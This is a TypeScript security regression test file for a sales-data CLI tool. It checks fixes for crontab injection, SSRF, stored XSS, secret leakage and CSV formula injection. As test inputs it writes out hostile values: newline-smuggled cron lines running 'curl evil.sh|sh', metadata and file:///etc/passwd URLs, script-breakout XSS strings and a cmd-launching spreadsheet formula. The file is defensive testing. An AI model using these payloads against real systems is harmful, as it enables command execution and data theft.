import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { chmodSync, mkdtempSync, readFileSync, rmSync, statSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { platform } from "node:process";
import test from "node:test";
import {
  createFilePlanStore,
  mergeSnapshots,
  storeCredential,
  getCredential,
  credentialsPath,
  type CanonicalGtmSnapshot,
} from "../src/index.ts";
import {
  assertSingleLineLabel,
  renderManagedBlock,
  type ScheduleEntry,
} from "../src/schedule.ts";
import { assertPublicUrl, validateObservationSet } from "../src/market.ts";
import { marketMapToHtml, safeJsonForScript } from "../src/marketReport.ts";

// Loose shapes for the golden fixture — the test mutates fields to attack sinks.
type MarketConfigShape = { anchorVendor: string; vendors: Array<{ id: string; name: string }> };
type ObservationSetShape = { observations: Array<{ confidence: string; evidence?: unknown[] }> };
import { buildEnrichPlan, parseEnrichConfig, type EnrichSourceRecord } from "../src/enrich.ts";
import { createStripeConnector } from "../src/connectors/stripe.ts";
import { createApolloClient } from "../src/enrichApollo.ts";

const repoRoot = resolve(import.meta.dirname, "..");

function withTempHome<T>(run: () => T): T {
  const dir = mkdtempSync(join(tmpdir(), "fsgtm-sec-"));
  const previous = process.env.FSGTM_HOME;
  process.env.FSGTM_HOME = dir;
  try {
    return run();
  } finally {
    if (previous === undefined) delete process.env.FSGTM_HOME;
    else process.env.FSGTM_HOME = previous;
    rmSync(dir, { recursive: true, force: true });
  }
}

// chmod is a no-op on Windows; these assertions are POSIX-only.
const posix = platform !== "win32";

test("credential file and home directory are owner-only even after a prior plans write", () =>
  withTempHome(() => {
    // Reproduce the gap: a plan write created the home dir BEFORE any login.
    const plan = {
      id: "patch_plan_sec",
      title: "t",
      createdAt: new Date().toISOString(),
      status: "needs_approval" as const,
      dryRun: true as const,
      summary: "s",
      findings: [],
      operations: [],
    };
    void createFilePlanStore().save(plan);

    storeCredential("hubspot", {
      kind: "private_app",
      accessToken: "pat-secret",
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    });

    if (posix) {
      const home = process.env.FSGTM_HOME!;
      assert.equal(statSync(home).mode & 0o777, 0o700, "home dir must be 0700");
      assert.equal(statSync(credentialsPath()).mode & 0o777, 0o600, "cred file must be 0600");
      assert.equal(statSync(join(home, "plans")).mode & 0o777, 0o700, "plans dir must be 0700");
    }
  }));

test("login rejects secrets passed as argv flags", () => {
  const dir = mkdtempSync(join(tmpdir(), "fsgtm-sec-cli-"));
  try {
    const env = { ...process.env, FSGTM_HOME: dir } as NodeJS.ProcessEnv;
    const result = spawnSync(
      process.execPath,
      [
        "--experimental-strip-types", "src/bin.ts",
        "login", "stripe", "--token", "sk_live_leak", "--no-validate",
      ],
      { cwd: repoRoot, encoding: "utf8", env, input: "" },
    );
    assert.equal(result.status, 1);
    assert.match(result.stderr, /no longer accepts a value on the command line/);
    // The secret must not be echoed back in any output.
    assert.doesNotMatch(result.stdout + result.stderr, /sk_live_leak/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("login reads the secret from stdin without exposing it on argv", () => {
  const dir = mkdtempSync(join(tmpdir(), "fsgtm-sec-stdin-"));
  try {
    const env = { ...process.env, FSGTM_HOME: dir } as NodeJS.ProcessEnv;
    const result = spawnSync(
      process.execPath,
      [
        "--experimental-strip-types", "src/bin.ts",
        "login", "stripe", "--no-validate",
      ],
      { cwd: repoRoot, encoding: "utf8", env, input: "sk_piped_secret\n" },
    );
    assert.equal(result.status, 0, result.stderr);
    const stored = JSON.parse(readFileSync(join(dir, "credentials.json"), "utf8"));
    assert.equal(stored.providers.stripe.accessToken, "sk_piped_secret");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("merge no longer auto-merges same-name accounts with different domains", () => {
  const a: CanonicalGtmSnapshot = {
    generatedAt: "2026-06-01T00:00:00.000Z",
    provider: "hubspot",
    users: [],
    accounts: [{ id: "h1", crmId: "h1", name: "Acme Inc", domain: "acme-east.com" }],
    contacts: [],
    deals: [{ id: "hd", crmId: "hd", accountId: "h1", name: "East deal", amount: 10, isClosed: false }],
    activities: [],
  };
  const b: CanonicalGtmSnapshot = {
    generatedAt: "2026-06-01T00:00:00.000Z",
    provider: "salesforce",
    users: [],
    // Same display name, genuinely different company (different domain).
    accounts: [{ id: "s1", crmId: "s1", name: "Acme Inc", domain: "acme-west.com" }],
    contacts: [],
    deals: [{ id: "sd", crmId: "sd", accountId: "s1", name: "West deal", amount: 20, isClosed: false }],
    activities: [],
  };

  const { snapshot, report } = mergeSnapshots([a, b]);

  // The two "Acme Inc" remain separate accounts...
  assert.equal(snapshot.accounts.length, 2);
  assert.ok(snapshot.accounts.every((account) => account.identities?.length === 1));
  // ...their deals are NOT cross-linked...
  const eastDeal = snapshot.deals.find((deal) => deal.name === "East deal")!;
  const westDeal = snapshot.deals.find((deal) => deal.name === "West deal")!;
  assert.notEqual(eastDeal.accountId, westDeal.accountId);
  // ...but the collision is surfaced for human review.
  assert.equal(report.suggestions.length, 1);
  assert.equal(report.suggestions[0].name, "Acme Inc");
  assert.equal(report.suggestions[0].recordIds.length, 2);
});

// ===========================================================================
// 0.25.2 — Security hardening I (findings from the 2026-06-15 adversarial audit)
// ===========================================================================

// 1. Crontab injection via schedule --label (CONFIRMED CRITICAL)

test("schedule label: newlines and control chars are rejected at add time", () => {
  assert.throws(() => assertSingleLineLabel("weekly\n* * * * * curl evil.sh|sh"), /newlines or control characters/);
  assert.throws(() => assertSingleLineLabel("a\rb"), /newlines or control characters/);
  assert.throws(() => assertSingleLineLabel("a\tb"), /newlines or control characters/);
  assert.doesNotThrow(() => assertSingleLineLabel("weekly-apollo-refresh"));
});

test("renderManagedBlock: a tampered label is contained to the comment line", () => {
  const entry: ScheduleEntry = {
    id: "sch_ok",
    label: "messy label", // benign, single line
    argv: ["audit", "--provider", "hubspot"],
    cron: "0 6 * * 1",
    provider: "local",
    enabled: true,
    createdAt: "2026-06-15T00:00:00.000Z",
  };
  const block = renderManagedBlock("default", [entry], "fullstackgtm");
  const executable = block.split("\n").filter((line) => line && !line.startsWith("#"));
  assert.equal(executable.length, 1, "the only non-comment line must be the dispatch line");
  assert.match(executable[0], /schedule run sch_ok --profile default --trigger cron$/);
});

test("renderManagedBlock: a tampered cron/id field is refused, not rendered into a live crontab line", () => {
  // The round-1 fix only sanitized the comment line; the EXECUTABLE line embeds
  // cron and id raw. A hand-edited schedules.json with a newline in cron must be
  // refused outright (the re-attack's confirmed bypass).
  const cronTamper: ScheduleEntry = {
    id: "sch_x",
    label: "daily",
    argv: ["audit"],
    cron: "* * * * * touch /tmp/PWNED #\n* * * * * touch /tmp/PWNED2",
    provider: "local",
    enabled: true,
    createdAt: "2026-06-15T00:00:00.000Z",
  };
  assert.throws(() => renderManagedBlock("default", [cronTamper], "fullstackgtm"), /tampered|control character/i);

  const idTamper: ScheduleEntry = { ...cronTamper, cron: "0 6 * * 1", id: "sch_y\n* * * * * curl evil|sh" };
  assert.throws(() => renderManagedBlock("default", [idTamper], "fullstackgtm"), /tampered|control character/i);
});

test("renderManagedBlock: a newline in the CLI invocation (FSGTM_HOME) cannot inject a crontab line", () => {
  // The third bypass: cliInvocation embeds FSGTM_HOME; a newline there would
  // split the executable line. renderManagedBlock must refuse it.
  const entry: ScheduleEntry = {
    id: "sch_ok",
    label: "daily",
    argv: ["audit"],
    cron: "0 3 * * *",
    provider: "local",
    enabled: true,
    createdAt: "2026-06-15T00:00:00.000Z",
  };
  const evilInvocation = "FSGTM_HOME='/tmp/x\n* * * * * touch /tmp/PWNED #' node cli.js";
  assert.throws(() => renderManagedBlock("default", [entry], evilInvocation), /newline or control character/i);
});

// 2. SSRF in market capture (CONFIRMED HIGH)

test("assertPublicUrl: refuses non-http schemes, metadata, loopback, and private ranges", async () => {
  await assert.rejects(assertPublicUrl("file:///etc/passwd"), /only http\/https/);
  await assert.rejects(assertPublicUrl("ftp://example.com"), /only http\/https/);
  await assert.rejects(assertPublicUrl("http://169.254.169.254/latest/meta-data/"), /private\/loopback/);
  await assert.rejects(assertPublicUrl("http://127.0.0.1:8080/admin"), /private\/loopback/);
  await assert.rejects(assertPublicUrl("http://10.0.0.5/"), /private\/loopback/);
  await assert.rejects(assertPublicUrl("http://192.168.1.1/"), /private\/loopback/);
  await assert.rejects(assertPublicUrl("http://172.16.0.1/"), /private\/loopback/);
  await assert.rejects(assertPublicUrl("http://[::1]/"), /private\/loopback/);
  await assert.rejects(assertPublicUrl("http://[::ffff:127.0.0.1]/"), /private\/loopback/);
  // A public IP literal is allowed (no DNS lookup needed).
  const ok = await assertPublicUrl("https://93.184.216.34/");
  assert.equal(ok.protocol, "https:");
});

// 3. Stored XSS in the market HTML report (CONFIRMED HIGH)

test("safeJsonForScript: a </script> in untrusted data cannot break out of the inline script", () => {
  const payload = { name: "</script><img src=x onerror=alert(1)>", amp: "a&b", ltgt: "<b>" };
  const out = safeJsonForScript(payload);
  assert.ok(!out.includes("</script>"), "must not contain a raw closing script tag");
  assert.ok(!out.includes("<img"), "must not contain a raw tag");
  assert.ok(out.includes("\\u003c/script"), "the breakout sequence is escaped");
  // Round-trips to the identical value (escaping is at the HTML layer only).
  assert.deepEqual(JSON.parse(out), payload);
});

test("market HTML report: a malicious vendor name and confidence are escaped at every sink", () => {
  const fixture = JSON.parse(
    readFileSync(join(import.meta.dirname, "fixtures", "marketCreativeIntel.json"), "utf8"),
  ) as { config: MarketConfigShape; set: ObservationSetShape };
  const evil = "<img src=x onerror=alert(1)>";
  // Poison the anchor vendor's name (reaches the group-summary anchorNote) ...
  const anchorId = fixture.config.anchorVendor;
  for (const v of fixture.config.vendors) if (v.id === anchorId) v.name = evil;
  // ... and an observation's confidence (reaches the evidence appendix).
  const withEv = fixture.set.observations.find((o) => o.evidence && o.evidence.length > 0);
  if (withEv) withEv.confidence = evil as never;
  const html = marketMapToHtml(fixture.config as never, fixture.set as never);
  assert.ok(!html.includes(evil), "no raw <img onerror> may appear anywhere in the rendered report");
  assert.ok(html.includes("&lt;img"), "the payload must be HTML-escaped");
});

test("validateObservationSet: a non-enum confidence (markup) is rejected before it can reach the report", () => {
  const fixture = JSON.parse(
    readFileSync(join(import.meta.dirname, "fixtures", "marketCreativeIntel.json"), "utf8"),
  ) as { config: MarketConfigShape; set: ObservationSetShape };
  fixture.set.observations[0].confidence = "<script>alert(1)</script>" as never;
  const problems = validateObservationSet(fixture.config as never, fixture.set as never);
  assert.ok(
    problems.some((p) => /invalid confidence/.test(p)),
    "observe --from must reject a non-enum confidence",
  );
});

// 4. Provider response bodies must not leak into error messages (CONFIRMED)

test("Apollo client: a non-ok response throws a status line, never the body", async () => {
  const fetchImpl = (async () =>
    new Response("SECRET_BODY query=ceo@target.com apollo_key=sk-leak", { status: 400 })) as unknown as typeof fetch;
  const client = createApolloClient({ getApiKey: () => "fake", fetchImpl });
  await assert.rejects(client.enrichOrganization("acme.com"), (err: Error) => {
    assert.match(err.message, /Apollo API error 400/);
    assert.doesNotMatch(err.message, /SECRET_BODY|sk-leak|ceo@target/);
    return true;
  });
});

test("Stripe connector: a non-ok response throws a status line, never the body", async () => {
  const fetchImpl = (async () =>
    new Response("error: key sk_live_xxx not authorized", { status: 401 })) as unknown as typeof fetch;
  const connector = createStripeConnector({ getApiKey: async () => "sk_live_xxx", fetchImpl });
  await assert.rejects(connector.fetchSnapshot(), (err: Error) => {
    assert.match(err.message, /Stripe API error 401/);
    assert.doesNotMatch(err.message, /sk_live_xxx/);
    return true;
  });
});

// 5. CSV/formula injection neutralized at the write path (CONFIRMED)

function enrichCsvConfig() {
  return parseEnrichConfig(
    JSON.stringify({
      sources: { clay: { kind: "ingest", format: "csv" } },
      match: { company: { keys: ["domain"], onAmbiguous: "skip" } },
      fields: { company: [{ crm: "industry", from: { clay: "Industry" } }] },
      policy: { overwrite: "never", defaultStaleDays: 90 },
    }),
  );
}

function blankIndustrySnapshot(): CanonicalGtmSnapshot {
  return {
    generatedAt: "2026-06-15T00:00:00.000Z",
    provider: "mock",
    users: [],
    accounts: [{ id: "1001", name: "Acme Inc", domain: "acme.com" }], // industry blank → append fills it
    contacts: [],
    deals: [],
    activities: [],
  };
}

test("enrich write path: a formula-injection value is neutralized with a leading apostrophe", () => {
  const records: EnrichSourceRecord[] = [
    { id: "clay:1", objectType: "company", keys: { domain: "acme.com" }, payload: { Industry: "=cmd|'/c calc'!A1" } },
  ];
  const result = buildEnrichPlan({
    config: enrichCsvConfig(),
    source: "clay",
    mode: "append",
    snapshot: blankIndustrySnapshot(),
    records,
    runLabel: "r",
  });
  assert.equal(result.counts.opsEmitted, 1);
  assert.equal(result.plan.operations[0].afterValue, "'=cmd|'/c calc'!A1");
});

test("enrich write path: ordinary values are written verbatim (no false neutralization)", () => {
  const records: EnrichSourceRecord[] = [
    { id: "clay:1", objectType: "company", keys: { domain: "acme.com" }, payload: { Industry: "Software" } },
  ];
  const result = buildEnrichPlan({
    config: enrichCsvConfig(),
    source: "clay",
    mode: "append",
    snapshot: blankIndustrySnapshot(),
    records,
    runLabel: "r",
  });
  assert.equal(result.plan.operations[0].afterValue, "Software");
});

// 6. Credential file mode enforced on read, not just write (CONFIRMED)

test("credentials: a world-readable store is re-tightened to 0600 on read", () =>
  withTempHome(() => {
    if (!posix) return;
    storeCredential("hubspot", {
      kind: "private_app",
      accessToken: "pat",
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    });
    // Simulate an inherited loose mode (restored backup / cloned home).
    chmodSync(credentialsPath(), 0o644);
    assert.equal(statSync(credentialsPath()).mode & 0o777, 0o644);
    // Any read must tighten it.
    getCredential("hubspot");
    assert.equal(statSync(credentialsPath()).mode & 0o777, 0o600);
  }));
